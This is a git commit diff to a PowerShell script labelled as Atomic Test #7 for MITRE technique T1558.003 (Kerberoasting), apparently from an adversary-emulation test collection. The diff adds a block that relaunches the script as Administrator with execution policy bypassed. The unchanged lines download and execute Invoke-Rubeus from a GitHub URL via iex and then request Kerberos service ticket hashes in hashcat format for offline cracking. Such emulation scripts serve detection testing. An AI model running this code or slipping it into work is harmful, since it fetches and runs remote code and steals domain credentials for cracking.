41fec86f04feca8c5960c8170a8c56ad52a42c76
keith.salandanan <keith.salandanan@oqulo.com>
2022-09-27 15:08:25 +0800

    edited T1558.003

--- Credential Access/T1558.003.ps1
+++ Credential Access/T1558.003.ps1
@@ -1,4 +1,9 @@
 #Atomic Test #7 - WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
 
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process PowerShell -Verb RunAs "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; & '$PSCommandPath';`"";
+    exit;
+}
+
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
 Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap"
